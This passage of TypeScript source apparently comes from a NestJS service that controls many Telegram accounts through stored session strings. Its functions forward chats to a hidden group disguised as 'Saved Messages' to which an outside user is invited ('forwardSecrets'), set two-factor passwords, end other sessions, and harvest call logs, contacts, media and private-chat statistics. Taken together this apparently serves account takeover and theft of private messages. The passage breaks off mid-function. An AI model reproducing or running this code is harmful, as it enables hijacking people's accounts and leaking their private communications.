ClientMetadataTracker.getInstance();\n        this.cleanupInterval = this.connectionManager.startCleanupInterval();\n    }\n\n    async onModuleDestroy() {\n        this.logger.logOperation('system', 'Module destroy initiated');\n        clearInterval(this.cleanupInterval as NodeJS.Timeout);\n        await this.disconnectAll();\n    }\n    public getActiveClientSetup() {\n        return TelegramManager.getActiveClientSetup();\n    }\n\n    public setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\n        TelegramManager.setActiveClientSetup(data);\n    }\n\n    private async executeWithConnection<T>(mobile: string, operation: string, handler: (client: TelegramManager) => Promise<T>): Promise<T> {\n        this.logger.logOperation(mobile, `Starting operation: ${operation}`);\n        const client = await this.getClientOrThrow(mobile);\n        this.connectionManager.updateLastUsed(mobile);\n\n        try {\n            const result = await this.connectionManager.executeWithRateLimit(mobile, () => handler(client));\n            this.metadataTracker.recordOperation(mobile, operation, true);\n            this.logger.logOperation(mobile, `Completed operation: ${operation}`);\n            return result;\n        } catch (error) {\n            this.metadataTracker.recordOperation(mobile, operation, false);\n            throw error;\n        }\n    }\n\n    private async getClientOrThrow(mobile: string): Promise<TelegramManager> {\n        const client = await this.getClient(mobile);\n        if (!client) {\n            throw new TelegramError('Client not found', TelegramErrorCode.CLIENT_NOT_FOUND);\n        }\n        return client;\n    }\n\n    public async getClient(mobile: string): Promise<TelegramManager | undefined> {\n        const client = TelegramService.clientsMap.get(mobile);\n        try {\n            if (client && client.connected()) {\n                await client.connect();\n                return client;\n            }\n        } catch (error) {\n            console.error('Client connection error:', parseError(error));\n        }\n        return undefined;\n    }\n\n    public hasClient(number: string) {\n        return TelegramService.clientsMap.has(number);\n    }\n\n    async deleteClient(number: string) {\n        await this.connectionManager.releaseConnection(number);\n        return TelegramService.clientsMap.delete(number);\n    }\n\n    async disconnectAll() {\n        this.logger.logOperation('system', 'Disconnecting all clients');\n        const clients = Array.from(TelegramService.clientsMap.keys());\n        await Promise.all(\n            clients.map(mobile => {\n                this.logger.logOperation(mobile, 'Disconnecting client');\n                return this.connectionManager.releaseConnection(mobile);\n            })\n        );\n        TelegramService.clientsMap.clear();\n        this.bufferClientService.clearJoinChannelInterval();\n        this.logger.logOperation('system', 'All clients disconnected');\n    }\n\n    async createClient(mobile: string, autoDisconnect = true, handler = true): Promise<TelegramManager> {\n        this.logger.logOperation(mobile, 'Creating new client', { autoDisconnect, handler });\n        const user = (await this.usersService.search({ mobile }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        if (!this.hasClient(mobile)) {\n            let telegramManager = new TelegramManager(user.session, user.mobile);\n            let client: TelegramClient\n            try {\n                client = await telegramManager.createClient(handler);\n                await client.getMe();\n                if (client) {\n                    TelegramService.clientsMap.set(mobile, telegramManager);\n                    await this.connectionManager.acquireConnection(mobile, telegramManager);\n                    this.metadataTracker.initializeClient(mobile);\n                    this.logger.logOperation(mobile, 'Client created successfully');\n                    if (autoDisconnect) {\n                        setTimeout(async () => {\n                            this.logger.logOperation(mobile, 'Auto-disconnecting client');\n                            if (client.connected || await this.getClient(mobile)) {\n                                console.log(\"SELF destroy client : \", mobile);\n                                await telegramManager.disconnect();\n                            } else {\n                                console.log(\"Client Already Disconnected : \", mobile);\n                            }\n                            await this.connectionManager.releaseConnection(mobile);\n                            TelegramService.clientsMap.delete(mobile);\n                            this.metadataTracker.removeClient(mobile);\n                        }, 180000)\n                    } else {\n                        setInterval(async () => {\n                            //console.log(\"destroying loop :\", mobile)\n                            //client._destroyed = true\n                            // if (!client.connected) {\n                            // await client.connect();\n                            //}\n                        }, 20000);\n                    }\n                    return telegramManager;\n                } else {\n                    throw new BadRequestException('Client Expired');\n                }\n            } catch (error) {\n                this.logger.logError(mobile, 'Client creation failed', error);\n                console.log(\"Parsing Error\");\n                if (telegramManager) {\n                    await this.connectionManager.releaseConnection(mobile);\n                    telegramManager = null;\n                    TelegramService.clientsMap.delete(mobile);\n                    this.metadataTracker.removeClient(mobile);\n                }\n                const errorDetails = parseError(error);\n                if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"session_revoked\", \"user_deactivated_ban\"])) {\n                    console.log(\"Deleting User: \", user.mobile);\n                    await this.usersService.updateByFilter({ $or: [{ tgId: user.tgId }, { mobile: mobile }] }, { expired: true });\n                } else {\n                    console.log('Not Deleting user');\n                }\n                throw new BadRequestException(errorDetails.message)\n            }\n        } else {\n            console.log(\"Client Already exists\")\n            return await this.getClient(mobile)\n        }\n    }\n\n    async getMessages(mobile: string, username: string, limit: number = 8) {\n        const telegramClient = await this.getClient(mobile)\n        return telegramClient.getMessages(username, limit);\n    }\n\n\n    async getMessagesNew(mobile: string, username: string, offset: number, limit: number) {\n        const telegramClient = await this.getClient(mobile)\n        return telegramClient.getMessagesNew(username, offset, limit);\n    }\n\n    async sendInlineMessage(mobile: string, chatId: string, message: string, url: string) {\n        const telegramClient = await this.getClient(mobile)\n        return telegramClient.sendInlineMessage(chatId, message, url);\n    }\n\n    async getChatId(mobile: string, username: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getchatId(username);\n    }\n\n    async getLastActiveTime(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getLastActiveTime();\n    }\n\n    async tryJoiningChannel(mobile: string, chatEntity: Channel) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            await telegramClient.joinChannel(chatEntity.username);\n            console.log(telegramClient.phoneNumber, \" - Joined channel Success - \", chatEntity.username);\n            if (chatEntity.canSendMsgs) {\n                // try {\n                //     await this.activeChannelsService.update(chatEntity.channelId, chatEntity);\n                //     console.log(\"updated ActiveChannels\");\n                // } catch (error) {\n                //     console.log(parseError(error));\n                //     console.log(\"Failed to update ActiveChannels\");\n                // }\n            } else {\n                await this.channelsService.remove(chatEntity.channelId);\n                await this.activeChannelsService.remove(chatEntity.channelId);\n                console.log(\"Removed Channel- \", chatEntity.username);\n            }\n        } catch (error) {\n            console.log(telegramClient.phoneNumber, \" - Failed to join - \", chatEntity.username);\n            this.removeChannels(error, chatEntity.channelId, chatEntity.username);\n            throw error\n        }\n    };\n\n    async removeChannels(error: any, channelId: string, username: string) {\n        if (error.errorMessage == \"USERNAME_INVALID\" || error.errorMessage == 'CHAT_INVALID' || error.errorMessage == 'USERS_TOO_MUCH' || error.toString().includes(\"No user has\")) {\n            try {\n                if (channelId) {\n                    await this.channelsService.remove(channelId)\n                    await this.activeChannelsService.remove(channelId);\n                    console.log(\"Removed Channel- \", channelId);\n                } else {\n                    const channelDetails = (await this.channelsService.search({ username: username }))[0];\n                    await this.channelsService.remove(channelDetails.channelId)\n                    await this.activeChannelsService.remove(channelDetails.channelId);\n                    console.log(\"Removed Channel - \", channelDetails.channelId);\n                }\n            } catch (searchError) {\n                console.log(\"Failed to search/remove channel: \", searchError);\n            }\n        } else if (error.errorMessage === \"CHANNEL_PRIVATE\") {\n            await this.channelsService.update(channelId, { private: true })\n            await this.activeChannelsService.update(channelId, { private: true });\n        }\n    }\n\n    async getGrpMembers(mobile: string, entity: EntityLike) {\n        try {\n            const telegramClient = await this.getClient(mobile);\n            return await telegramClient.getGrpMembers(entity)\n        } catch (err) {\n            console.error(\"Error fetching group members:\", err);\n        }\n    }\n\n    async addContact(mobile: string, data: { mobile: string, tgId: string }[], prefix: string) {\n        try {\n            const telegramClient = await this.getClient(mobile);\n            return await telegramClient.addContact(data, prefix)\n        } catch (err) {\n            console.error(\"Error fetching adding Contacts:\", err);\n        }\n    }\n\n\n    async addContacts(mobile: string, phoneNumbers: string[], prefix: string) {\n        try {\n            const telegramClient = await this.getClient(mobile);\n            return await telegramClient.addContacts(phoneNumbers, prefix)\n        } catch (err) {\n            console.error(\"Error fetching adding Contacts:\", err);\n        }\n    }\n\n    async getSelfMsgsInfo(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getSelfMSgsInfo();\n    }\n\n    async createGroup(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.createGroup();\n    }\n\n    async forwardSecrets(mobile: string, fromChatId: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.createGroupAndForward(fromChatId);\n    }\n\n\n    async joinChannelAndForward(mobile: string, fromChatId: string, channel: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.joinChannelAndForward(fromChatId, channel);\n    }\n\n    async blockUser(mobile: string, chatId: string) {\n        const telegramClient = await this.getClient(mobile);\n        return await telegramClient.blockUser(chatId);\n    }\n\n\n    async joinChannel(mobile: string, channelId: string) {\n        const telegramClient = await this.getClient(mobile);\n        return await telegramClient.joinChannel(channelId);\n    }\n\n    async getCallLog(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getCallLog();\n    }\n\n    async getmedia(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getMediaMessages();\n    }\n\n    async getChannelInfo(mobile: string, sendIds: boolean = false): Promise<ChannelInfo> {\n        return this.executeWithConnection(mobile, 'Get channel info', async (client) => {\n            return await client.channelInfo(sendIds);\n        });\n    }\n\n    async getMe(mobile: string) {\n        return this.executeWithConnection(mobile, 'Get profile info', async (client) => {\n            return await client.getMe();\n        });\n    }\n\n    async getEntity(mobile: string, entity: EntityLike) {\n        return this.executeWithConnection(mobile, 'Get entity info', async (client) => {\n            return await client.getEntity(entity); // Assuming 'getEntity()' is a valid method\n        });\n    }\n\n    async createNewSession(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.createNewSession();\n    }\n\n    async set2Fa(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            await telegramClient.set2fa();\n            await telegramClient.disconnect();\n            return '2Fa set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        }\n    }\n\n    async updatePrivacyforDeletedAccount(mobile: string) {\n        const telegramClient = await this.getClient(mobile);\n        await telegramClient.updatePrivacyforDeletedAccount()\n    }\n\n    async deleteProfilePhotos(mobile: string) {\n        const telegramClient = await this.getClient(mobile);\n        await telegramClient.deleteProfilePhotos()\n    }\n\n    async setProfilePic(\n        mobile: string, name: string,\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        await telegramClient.deleteProfilePhotos();\n        try {\n            await CloudinaryService.getInstance(name);\n            await sleep(2000);\n            const rootPath = process.cwd();\n            console.log(\"checking path\", rootPath)\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\n            await sleep(1000);\n            await telegramClient.disconnect();\n            return 'Profile pic set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        }\n    }\n\n    async updatePrivacy(\n        mobile: string,\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            await telegramClient.updatePrivacy()\n            return \"Privacy updated successfully\";\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        }\n    }\n\n    async downloadProfilePic(\n        mobile: string, index: number\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            return await telegramClient.downloadProfilePic(index)\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async updateUsername(\n        mobile: string, username: string,\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            return await telegramClient.updateUsername(username)\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async getMediaMetadata(mobile: string, chatId?: string, offset?: number, limit: number = 100) {\n        return this.executeWithConnection(mobile, 'Get media metadata', async (client) => {\n            return await client.getMediaMetadata(chatId, offset, limit);\n        });\n    }\n\n    async downloadMediaFile(mobile: string, messageId: number, chatId: string, res: any) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.downloadMediaFile(messageId, chatId, res)\n    }\n\n    async forwardMessage(mobile: string, toChatId: string, fromChatId: string, messageId: number) {\n        const telegramClient = await this.getClient(mobile);\n        return await telegramClient.forwardMessage(toChatId, fromChatId, messageId);\n    }\n\n    async leaveChannels(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        const channelinfo = await telegramClient.channelInfo(false);\n        const leaveChannelIds = channelinfo.canSendFalseChats\n        return await telegramClient.leaveChannels(leaveChannelIds);\n    }\n\n\n    async leaveChannel(mobile: string, channel: string): Promise<void> {\n        await this.executeWithConnection(mobile, 'Leave channel',\n            (client) => client.leaveChannels([channel]),\n        );\n    }\n\n    async deleteChat(mobile: string, chatId: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.deleteChat(chatId);\n    }\n    async updateNameandBio(\n        mobile: string,\n        firstName: string,\n        about?: string,\n    ): Promise<void> {\n        await this.executeWithConnection(mobile, 'Update profile',\n            (client) => client.updateProfile(firstName, about),\n        );\n    }\n\n    async getDialogs(mobile: string, query: DialogsQueryDto) {\n        return this.executeWithConnection(mobile, 'Get dialogs', async (client) => {\n            const { limit = 10, offsetId, archived = false } = query;\n            const dialogs = await client.getDialogs({ limit, offsetId, archived });\n            const chatData = [];\n            for (const chat of dialogs) {\n                const chatEntity = await chat.entity.toJSON();\n                chatData.push(chatEntity);\n            }\n            return chatData;\n        });\n    }\n\n    async getConnectionStatus(): Promise<{\n        activeConnections: number;\n        rateLimited: number;\n        totalOperations: number;\n    }> {\n        const status = {\n            activeConnections: this.connectionManager.getActiveConnectionCount(),\n            rateLimited: 0,\n            totalOperations: 0\n        };\n\n        this.logger.logOperation('system', 'Connection status retrieved', status);\n        return status;\n    }\n\n    async forwardBulkMessages(\n        mobile: string,\n        fromChatId: string,\n        toChatId: string,\n        messageIds: number[]\n    ): Promise<void> {\n        await this.executeWithConnection(mobile, 'Forward bulk messages',\n            (client) => client.forwardMessages(fromChatId, toChatId, messageIds),\n        );\n    }\n\n    async getAuths(mobile: string): Promise<any[]> {\n        return this.executeWithConnection(mobile, 'Get authorizations', async (client) => {\n            const auths = await client.getAuths();\n            this.logger.logOperation(mobile, 'Retrieved authorizations', {\n                count: auths?.length || 0\n            });\n            return auths;\n        });\n    }\n\n    async removeOtherAuths(mobile: string): Promise<void> {\n        return this.executeWithConnection(mobile, 'Remove other authorizations', async (client) => {\n            await client.removeOtherAuths();\n            this.logger.logOperation(mobile, 'Removed other authorizations');\n        });\n    }\n\n    async getClientMetadata(mobile: string): Promise<ClientMetadata | undefined> {\n        return this.metadataTracker.getMetadata(mobile);\n    }\n\n    async getClientStatistics() {\n        return this.metadataTracker.getStatistics();\n    }\n\n    private async handleReconnect(mobile: string): Promise<void> {\n        this.metadataTracker.recordReconnect(mobile);\n        this.logger.logWarning(mobile, 'Client reconnection triggered');\n        // Additional reconnection logic if needed\n    }\n\n    // Helper method to handle batch operations with rate limiting\n    public async processBatch<T>(\n        items: T[],\n        batchSize: number,\n        processor: (batch: T[]) => Promise<void>,\n        delayMs: number = 2000\n    ): Promise<{ processed: number, errors: Error[] }> {\n        const errors: Error[] = [];\n        let processed = 0;\n\n        for (let i = 0; i < items.length; i += batchSize) {\n            const batch = items.slice(i, i + batchSize);\n            try {\n                await processor(batch);\n                processed += batch.length;\n                if (i + batchSize < items.length) {\n                    await new Promise(resolve => setTimeout(resolve, delayMs));\n                }\n            } catch (error) {\n                errors.push(error);\n                this.logger.logError('batch-process', 'Batch processing failed', error);\n            }\n        }\n\n        return { processed, errors };\n    }\n\n    // Enhanced Group Management\n    async createGroupWithOptions(mobile: string, options: GroupOptions) {\n        return this.executeWithConnection(mobile, 'Create group with options', async (client) => {\n            const result = await client.createGroupWithOptions(options);\n            this.logger.logOperation(mobile, 'Group created', { id: result.id?.toString() });\n            return result;\n        });\n    }\n\n    async updateGroupSettings(\n        mobile: string,\n        settings: {\n            groupId: string;\n            title?: string;\n            description?: string;\n            slowMode?: number;\n            memberRestrictions?: any;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Update group settings', (client) =>\n            client.updateGroupSettings(settings)\n        );\n    }\n\n    // Message Scheduling\n    async scheduleMessage(mobile: string, options: MessageScheduleOptions): Promise<void> {\n        await this.executeWithConnection(mobile, 'Schedule message',\n            async (client) => {\n                await client.scheduleMessageSend({\n                    chatId: options.chatId,\n                    message: options.message,\n                    scheduledTime: options.scheduledTime,\n                    replyTo: options.replyTo,\n                    silent: options.silent\n                });\n            },\n        );\n    }\n\n    async getScheduledMessages(mobile: string, chatId: string) {\n        return this.executeWithConnection(mobile, 'Get scheduled messages', (client) =>\n            client.getScheduledMessages(chatId)\n        );\n    }\n\n    // Enhanced Media Operations\n    async sendMediaAlbum(mobile: string, album: MediaAlbumOptions) {\n        return this.executeWithConnection(mobile, 'Send media album', (client) =>\n            client.sendMediaAlbum(album)\n        );\n    }\n\n    async sendVoiceMessage(\n        mobile: string,\n        voice: {\n            chatId: string;\n            url: string;\n            duration?: number;\n            caption?: string;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Send voice message', (client) =>\n            client.sendVoiceMessage(voice)\n        );\n    }\n\n    // Advanced Chat Operations\n    async cleanupChat(\n        mobile: string,\n        cleanup: {\n            chatId: string;\n            beforeDate?: Date;\n            onlyMedia?: boolean;\n            excludePinned?: boolean;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Clean up chat', (client) =>\n            client.cleanupChat(cleanup)\n        );\n    }\n\n    async getChatStatistics(mobile: string, chatId: string, period: 'day' | 'week' | 'month'): Promise<ChatStatistics> {\n        return this.executeWithConnection(mobile, 'Get chat statistics',\n            (client) => client.getChatStatistics(chatId, period),\n        );\n    }\n\n    // Enhanced Privacy Features\n    async updatePrivacyBatch(\n        mobile: string,\n        settings: {\n            phoneNumber?: 'everybody' | 'contacts' | 'nobody';\n            lastSeen?: 'everybody' | 'contacts' | 'nobody';\n            profilePhotos?: 'everybody' | 'contacts' | 'nobody';\n            forwards?: 'everybody' | 'contacts' | 'nobody';\n            calls?: 'everybody' | 'contacts' | 'nobody';\n            groups?: 'everybody' | 'contacts' | 'nobody';\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Update privacy settings batch', (client) =>\n            client.updatePrivacyBatch(settings)\n        );\n    }\n    // Content Filtering\n    async setContentFilters(\n        mobile: string,\n        filters: ContentFilter\n    ) {\n        return this.executeWithConnection(mobile, 'Set content filters', (client) =>\n            client.setContentFilters(filters)\n        );\n    }\n\n    // Helper method for batch operations with progress tracking\n    private async processBatchWithProgress<T>(\n        items: T[],\n        operation: (item: T) => Promise<void>,\n        batchSize: number = 10,\n        delayMs: number = 2000\n    ): Promise<{ completed: number; total: number; errors: Error[] }> {\n        const result = {\n            completed: 0,\n            total: items.length,\n            errors: [] as Error[]\n        };\n\n        for (let i = 0; i < items.length; i += batchSize) {\n            const batch = items.slice(i, i + batchSize);\n            await Promise.all(\n                batch.map(async (item) => {\n                    try {\n                        await operation(item);\n                        result.completed++;\n                    } catch (error) {\n                        result.errors.push(error);\n                    }\n                })\n            );\n\n            if (i + batchSize < items.length) {\n                await new Promise(resolve => setTimeout(resolve, delayMs));\n            }\n        }\n\n        return result;\n    }\n\n    // Group Member Management\n    async addGroupMembers(mobile: string, groupId: string, members: string[]): Promise<void> {\n        await this.executeWithConnection(mobile, 'Add group members',\n            (client) => client.addGroupMembers(groupId, members),\n        );\n    }\n\n    async removeGroupMembers(mobile: string, groupId: string, members: string[]): Promise<void> {\n        await this.executeWithConnection(mobile, 'Remove group members',\n            (client) => client.removeGroupMembers(groupId, members),\n        );\n    }\n\n    async promoteToAdmin(\n        mobile: string,\n        groupId: string,\n        userId: string,\n        permissions?: {\n            changeInfo?: boolean;\n            postMessages?: boolean;\n            editMessages?: boolean;\n            deleteMessages?: boolean;\n            banUsers?: boolean;\n            inviteUsers?: boolean;\n            pinMessages?: boolean;\n            addAdmins?: boolean;\n            anonymous?: boolean;\n            manageCall?: boolean;\n        },\n        rank?: string\n    ): Promise<void> {\n        await this.executeWithConnection(mobile, 'Promote to admin',\n            (client) => client.promoteToAdmin(groupId, userId, permissions, rank)\n        );\n    }\n\n    async demoteAdmin(mobile: string, groupId: string, userId: string): Promise<void> {\n        return this.executeWithConnection(mobile, 'Demote admin', async (client) => {\n            await client.demoteAdmin(groupId, userId);\n            this.logger.logOperation(mobile, 'Demoted admin to regular member', { groupId, userId });\n        });\n    }\n\n    async unblockGroupUser(mobile: string, groupId: string, userId: string): Promise<void> {\n        return this.executeWithConnection(mobile, 'Unblock group user', async (client) => {\n            await client.unblockGroupUser(groupId, userId);\n            this.logger.logOperation(mobile, 'Unblocked user in group', { groupId, userId });\n        });\n    }\n\n    async getGroupAdmins(mobile: string, groupId: string) {\n        return this.executeWithConnection(mobile, 'Get group admins', (client) =>\n            client.getGroupAdmins(groupId)\n        );\n    }\n\n    async getGroupBannedUsers(mobile: string, groupId: string) {\n        return this.executeWithConnection(mobile, 'Get group banned users', (client) =>\n            client.getGroupBannedUsers(groupId)\n        );\n    }\n\n    async searchMessages(\n        mobile: string,\n        params: {\n            chatId: string;\n            query?: string;\n            types?: ('all' | 'text' | 'photo' | 'video' | 'voice' | 'document')[];\n            offset?: number;\n            limit?: number;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Search messages', (client) =>\n            client.searchMessages(params)\n        );\n    }\n\n    async getFilteredMedia(\n        mobile: string,\n        params: {\n            chatId: string;\n            types?: ('photo' | 'video' | 'document' | 'voice')[];\n            startDate?: Date;\n            endDate?: Date;\n            offset?: number;\n            limit?: number;            \n            maxId?: number;\n            minId?: number;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Get filtered media', (client) =>\n            client.getFilteredMedia(params)\n        );\n    }\n\n    // Contact Management\n    async exportContacts(\n        mobile: string,\n        format: 'vcard' | 'csv',\n        includeBlocked: boolean = false\n    ) {\n        return this.executeWithConnection(mobile, 'Export contacts', (client) =>\n            client.exportContacts(format, includeBlocked)\n        );\n    }\n\n    async importContacts(\n        mobile: string,\n        contacts: { firstName: string; lastName?: string; phone: string }[]\n    ) {\n        return this.executeWithConnection(mobile, 'Import contacts', (client) =>\n            client.importContacts(contacts)\n        );\n    }\n\n    async manageBlockList(\n        mobile: string,\n        userIds: string[],\n        block: boolean\n    ) {\n        return this.executeWithConnection(mobile, block ? 'Block users' : 'Unblock users', (client) =>\n            client.manageBlockList(userIds, block)\n        );\n    }\n\n    async getContactStatistics(mobile: string) {\n        return this.executeWithConnection(mobile, 'Get contact statistics', (client) =>\n            client.getContactStatistics()\n        );\n    }\n\n    // Chat Folder Management\n    async createChatFolder(\n        mobile: string,\n        options: {\n            name: string;\n            includedChats: string[];\n            excludedChats?: string[];\n            includeContacts?: boolean;\n            includeNonContacts?: boolean;\n            includeGroups?: boolean;\n            includeBroadcasts?: boolean;\n            includeBots?: boolean;\n            excludeMuted?: boolean;\n            excludeRead?: boolean;\n            excludeArchived?: boolean;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Create chat folder', (client) =>\n            client.createChatFolder(options)\n        );\n    }\n\n    async getChatFolders(mobile: string) {\n        return this.executeWithConnection(mobile, 'Get chat folders', (client) =>\n            client.getChatFolders()\n        );\n    }\n\n    // Session Management\n    async getSessionInfo(mobile: string) {\n        return this.executeWithConnection(mobile, 'Get session info', (client) =>\n            client.getSessionInfo()\n        );\n    }\n\n    async terminateSession(\n        mobile: string, \n        options: {\n            hash: string;\n            type: 'app' | 'web';\n            exceptCurrent?: boolean;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Terminate session', (client) =>\n            client.terminateSession(options)\n        );\n    }\n\n    // Message Management\n    async editMessage(\n        mobile: string,\n        options: {\n            chatId: string;\n            messageId: number;\n            text?: string;\n            media?: {\n                type: 'photo' | 'video' | 'document';\n                url: string;\n            };\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Edit message', (client) =>\n            client.editMessage(options)\n        );\n    }\n\n    // Chat Management\n    async updateChatSettings(\n        mobile: string,\n        settings: {\n            chatId: string;\n            title?: string;\n            about?: string;\n            photo?: string;\n            slowMode?: number;\n            linkedChat?: string;\n            defaultSendAs?: string;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Update chat settings', (client) =>\n            client.updateChatSettings(settings)\n        );\n    }\n\n    // Media Handling\n    async sendMediaBatch(\n        mobile: string,\n        options: {\n            chatId: string;\n            media: Array<{\n                type: 'photo' | 'video' | 'document';\n                url: string;\n                caption?: string;\n                fileName?: string;\n            }>;\n            silent?: boolean;\n            scheduleDate?: number;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Send media batch', (client) =>\n            client.sendMediaBatch(options)\n        );\n    }\n\n    // Password Management\n    async hasPassword(mobile: string): Promise<boolean> {\n        return this.executeWithConnection(mobile, 'Check password status', (client) =>\n            client.hasPassword()\n        );\n    }\n\n    // Contact Management\n    async getContacts(mobile: string) {\n        return this.executeWithConnection(mobile, 'Get contacts list', (client) =>\n            client.getContacts()\n        );\n    }\n\n    // Extended Chat Functions\n    async getChats(\n        mobile: string,\n        options: {\n            limit?: number;\n            offsetDate?: number;\n            offsetId?: number;\n            offsetPeer?: string;\n            folderId?: number;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Get chats', (client) =>\n            client.getChats(options)\n        );\n    }\n\n    // File Operations\n    async getFileUrl(mobile: string, url: string, filename: string): Promise<string> {\n        return this.executeWithConnection(mobile, 'Get file URL', (client) =>\n            client.getFileUrl(url, filename)\n        );\n    }\n\n    // Message Stats\n    async getMessageStats(\n        mobile: string,\n        options: {\n            chatId: string;\n            period: 'day' | 'week' | 'month';\n            fromDate?: Date;\n        }\n    ) {\n        return this.executeWithConnection(mobile, 'Get message statistics', (client) =>\n            client.getMessageStats(options)\n        );\n    }\n\n    // Chat Analytics\n    async getTopPrivateChats(mobile: string): Promise<{\n        chatId: string;\n        username?: string;\n        firstName?: string;\n        lastName?: string;\n        totalMessages: number;\n        interactionScore: number;\n        calls: {\n            total: number;\n            incoming: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n            outgoing: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n        };\n        media: {\n            photos: number;\n            videos: number;\n        };\n        activityBreakdown: {\n            videoCalls: number;\n            audioCalls: number;\n            mediaSharing: number;\n            textMessages: number;\n        };\n    }[]> {\n        return this.executeWithConnection(mobile, 'Get top private chats', async (client) => {\n            return client.getTopPrivateChats();\n        });\n    }\n}\n","import { Api, TelegramClient } from 'telegram';\nimport { StringSession } from 'telegram/sessions';\nimport { NewMessage, NewMessageEvent } from 'telegram/events';\nimport axios from 'axios';\nimport * as fs from 'fs';\nimport { CustomFile } from 'telegram/client/uploads';\nimport { TotalList, sleep } from 'telegram/Helpers';\nimport { Dialog } from 'telegram/tl/custom/dialog';\nimport { LogLevel } from 'telegram/extensions/Logger';\nimport { MailReader } from '../../IMap/IMap';\nimport bigInt from 'big-integer';\nimport { IterDialogsParams } from 'telegram/client/dialogs';\nimport { EntityLike } from 'telegram/define';\nimport { contains } from '../../utils';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { ContentFilter } from '../../interfaces/telegram';\nimport {\n    GroupOptions\n} from '../../interfaces/telegram';\nimport { MediaAlbumOptions } from './types/telegram-types';\nimport { IterMessagesParams } from 'telegram/client/messages';\n\ninterface MessageScheduleOptions {\n    chatId: string;\n    message: string;\n    scheduledTime: Date;\n    replyTo?: number;\n    silent?: boolean;\n    media?: {\n        type: 'photo' | 'video' | 'document';\n        url: string;\n    };\n}\n\nclass TelegramManager {\n    private session: StringSession;\n    public phoneNumber: string;\n    public client: TelegramClient | null;\n    private channelArray: string[];\n    private static activeClientSetup: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string };\n    private contentFilters: Map<string, ContentFilter>;\n    private filterHandler: any;\n\n    constructor(sessionString: string, phoneNumber: string) {\n        this.session = new StringSession(sessionString);\n        this.phoneNumber = phoneNumber;\n        this.client = null;\n        this.channelArray = [];\n        this.contentFilters = new Map();\n    }\n\n    public static getActiveClientSetup() {\n        return TelegramManager.activeClientSetup;\n    }\n\n    public static setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\n        TelegramManager.activeClientSetup = data;\n    }\n\n    public async createGroup() {\n        const groupName = \"Saved Messages\"; // Customize your group name\n        const groupDescription = this.phoneNumber; // Optional description\n        const result: any = await this.client.invoke(\n            new Api.channels.CreateChannel({\n                title: groupName,\n                about: groupDescription,\n                megagroup: true,\n                forImport: true,\n            })\n        );\n        const { id, accessHash } = result.chats[0];\n\n        // Logic to categorize the dialog to a folder\n        const folderId = 1; // Replace with the desired folder ID\n        await this.client.invoke(\n            new Api.folders.EditPeerFolders({\n                folderPeers: [\n                    new Api.InputFolderPeer({\n                        peer: new Api.InputPeerChannel({\n                            channelId: id,\n                            accessHash: accessHash,\n                        }),\n                        folderId: folderId,\n                    }),\n                ],\n            })\n        );\n\n        // Add users to the channel\n        const usersToAdd = [\"fuckyoubabie\"]; // Replace with the list of usernames or user IDs\n        const addUsersResult = await this.client.invoke(\n            new Api.channels.InviteToChannel({\n                channel: new Api.InputChannel({\n                    channelId: id,\n                    accessHash: accessHash,\n                }),\n                users: usersToAdd\n            })\n        );\n        return { id, accessHash };\n    }\n\n    public async createGroupAndForward(fromChatId: string) {\n        const { id, accessHash } = await this.createGroup();\n        await 